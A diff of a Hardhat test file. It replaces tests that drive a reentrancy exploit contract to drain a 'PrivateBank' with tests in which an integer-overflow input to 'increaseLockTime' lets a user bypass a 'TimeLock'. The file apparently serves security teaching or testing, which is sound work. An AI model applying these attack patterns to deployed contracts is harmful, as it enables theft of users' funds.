@@ -1,150 +1,49 @@
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
-describe("PrivateBank Reentrancy Test", function() {
-  let privateBank;
-  let maliciousContract;
-  let owner;
-  let attacker;
-  let addr1;
-  
-  beforeEach(async function() {
-    // Get signers
-    [owner, attacker, addr1] = await ethers.getSigners();
-    
-    // Deploy Log contract
-    const Log = await ethers.getContractFactory("Log");
-    const log = await Log.deploy();
-    await log.deployed();
-    
-    // Deploy PrivateBank contract
-    const PrivateBank = await ethers.getContractFactory("PrivateBank");
-    privateBank = await PrivateBank.deploy(log.address);
-    await privateBank.deployed();
-    
-    // Deploy Malicious contract
-    const MaliciousContract = await ethers.getContractFactory("ReentrancyExploit");
-    maliciousContract = await MaliciousContract.deploy(privateBank.address);
-    await maliciousContract.deployed();
+describe("TimeLock", function () {
+  let timeLock;
+  let owner, bob, alice;
+
+  beforeEach(async function () {
+    [owner, bob, alice] = await ethers.getSigners();
+
+    // Deploy the TimeLock contract
+    const TimeLockContract = await ethers.getContractFactory("TimeLock");
+    timeLock = await TimeLockContract.deploy();
+    await timeLock.deployed();
   });
 
-  describe("Initial Setup", function() {
-    it("Should allow legitimate deposits", async function() {
-      const depositAmount = ethers.utils.parseEther("1.0");
-      
-      await privateBank.connect(addr1).Deposit({
-        value: depositAmount
-      });
-      
-      const balance = await privateBank.balances(addr1.address);
-      expect(balance).to.equal(depositAmount);
-    });
+  it("should allow Bob to bypass the locktime via overflow", async function () {
+    // Bob deposits 1 Ether
+    await timeLock.connect(bob).deposit({ value: ethers.utils.parseEther("1") });
 
-    it("Should allow legitimate withdrawals", async function() {
-      const depositAmount = ethers.utils.parseEther("1.0");
-      
-      await privateBank.connect(addr1).Deposit({
-        value: depositAmount
-      });
-      
-      await privateBank.connect(addr1).CashOut(depositAmount);
-      
-      const balance = await privateBank.balances(addr1.address);
-      expect(balance).to.equal(0);
-    });
+    // Bob causes an overflow in his lockTime
+    const currentLockTime = await timeLock.lockTime(bob.address);
+    const overflowValue = ethers.constants.MaxUint256.sub(currentLockTime).add(1);
+    await timeLock.connect(bob).increaseLockTime(overflowValue);
+
+    // Bob should be able to withdraw immediately
+    await expect(timeLock.connect(bob).withdraw()).to.changeEtherBalances(
+      [bob, timeLock],
+      [ethers.utils.parseEther("1"), ethers.utils.parseEther("-1")]
+    );
   });
 
-  describe("Reentrancy Attack", function() {
-    it("Should be vulnerable to reentrancy attack", async function() {
-      // Initial setup - deposit some ETH to the bank
-      const initialDeposit = ethers.utils.parseEther("5.0");
-      await privateBank.Deposit({ value: initialDeposit });
-      
-      // Fund malicious contract
-      const attackFunds = ethers.utils.parseEther("1.0");
-      await maliciousContract.connect(attacker).Deposit({ 
-        value: attackFunds 
-      });
+  it("should not allow Alice to withdraw before lock time expiration", async function () {
+    // Alice deposits 1 Ether
+    await timeLock.connect(alice).deposit({ value: ethers.utils.parseEther("1") });
 
-      // Get initial balances
-      const initialBankBalance = await ethers.provider.getBalance(privateBank.address);
-      const initialAttackerBalance = await ethers.provider.getBalance(maliciousContract.address);
+    // Attempt to withdraw before 1 week
+    await expect(timeLock.connect(alice).withdraw()).to.be.revertedWith("Lock time not expired");
 
-      // Execute attack
-      await maliciousContract.connect(attacker).attack();
+    // Fast forward 1 week
+    await ethers.provider.send("evm_increaseTime", [7 * 24 * 60 * 60]);
+    await ethers.provider.send("evm_mine");
 
-      // Get final balances
-      const finalBankBalance = await ethers.provider.getBalance(privateBank.address);
-      const finalAttackerBalance = await ethers.provider.getBalance(maliciousContract.address);
-
-      // Verify attack was successful
-      expect(finalBankBalance).to.be.lt(initialBankBalance);
-      expect(finalAttackerBalance).to.be.gt(initialAttackerBalance);
-    });
-
-    it("Should drain most of the bank's funds", async function() {
-      // Setup initial bank balance
-      const bankFunds = ethers.utils.parseEther("10.0");
-      await privateBank.Deposit({ value: bankFunds });
-      
-      // Setup attacker
-      const attackFunds = ethers.utils.parseEther("1.0");
-      await maliciousContract.connect(attacker).Deposit({ 
-        value: attackFunds 
-      });
-
-      // Execute attack
-      await maliciousContract.connect(attacker).attack();
-
-      // Check bank is mostly drained
-      const finalBankBalance = await ethers.provider.getBalance(privateBank.address);
-      expect(finalBankBalance).to.be.lt(ethers.utils.parseEther("0.1"));
-    });
-  });
-
-  describe("Post-Attack State", function() {
-    it("Should fail legitimate withdrawals after attack", async function() {
-      // Initial setup
-      const depositAmount = ethers.utils.parseEther("1.0");
-      await privateBank.connect(addr1).Deposit({
-        value: depositAmount
-      });
-      
-      // Execute attack that drains the contract
-      const attackFunds = ethers.utils.parseEther("1.0");
-      await maliciousContract.connect(attacker).Deposit({ 
-        value: attackFunds 
-      });
-      await maliciousContract.connect(attacker).attack();
-
-      // Try legitimate withdrawal
-      await expect(
-        privateBank.connect(addr1).CashOut(depositAmount)
-      ).to.be.reverted;
-    });
-
-    it("Should show incorrect balances after attack", async function() {
-      const depositAmount = ethers.utils.parseEther("1.0");
-      
-      // Legitimate user deposits
-      await privateBank.connect(addr1).Deposit({
-        value: depositAmount
-      });
-      
-      // Attack drains the contract
-      await maliciousContract.connect(attacker).Deposit({ 
-        value: depositAmount 
-      });
-      await maliciousContract.connect(attacker).attack();
-
-      // Check balances
-      const userBalance = await privateBank.balances(addr1.address);
-      const contractBalance = await ethers.provider.getBalance(privateBank.address);
-      
-      // User balance in mapping should still show deposit amount
-      expect(userBalance).to.equal(depositAmount);
-      // But actual contract balance should be near zero
-      expect(contractBalance).to.be.lt(depositAmount);
-    });
+    // Alice should now be able to withdraw
+    await expect(timeLock.connect(alice).withdraw()).to.changeEtherBalance(
+      alice, ethers.utils.parseEther("1")
+    );
   });
 });
